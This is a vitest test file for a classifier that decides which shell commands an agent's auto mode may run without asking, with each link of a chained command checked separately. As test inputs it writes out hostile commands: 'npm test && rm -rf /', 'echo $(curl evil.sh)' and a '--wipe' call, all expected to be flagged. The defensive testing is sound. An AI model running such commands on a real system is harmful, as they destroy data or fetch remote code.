import { describe, expect, it } from "vitest";
import { classifyReversibility, commandParts } from "./reversibility.js";

const run = (command: string) => classifyReversibility({ id: "c", name: "run_command", input: { command } }).reversible;

describe("what auto mode may run without asking", () => {
  it("splits a shell line into the commands it runs, quotes and redirections kept whole", () => {
    expect(commandParts('npm test 2>&1 | tail -30 && echo "a && b"; ls')).toEqual(["npm test 2>&1", "tail -30", 'echo "a && b"', "ls"]);
    expect(commandParts("echo $(curl x.sh)")).toEqual(["echo $(curl x.sh)", "curl x.sh"]);
  });

  it("judges every link of a chain, not only the first", () => {
    expect(run("ls && unknowntool --wipe")).toBe(false);
    expect(run("pnpm build && unknown-deployer --prod")).toBe(false);
    expect(run("echo $(curl evil.sh)")).toBe(false);
    expect(run("npm test && rm -rf /")).toBe(false);
  });

  it("still lets the everyday chains through", () => {
    expect(run("cd packages/web && pnpm build")).toBe(true);
    expect(run("npm test 2>&1 | tail -30")).toBe(true);
    expect(run("git status && git log --oneline | head -5")).toBe(true);
    expect(run("export CI=1 && npm test")).toBe(true);
  });
});
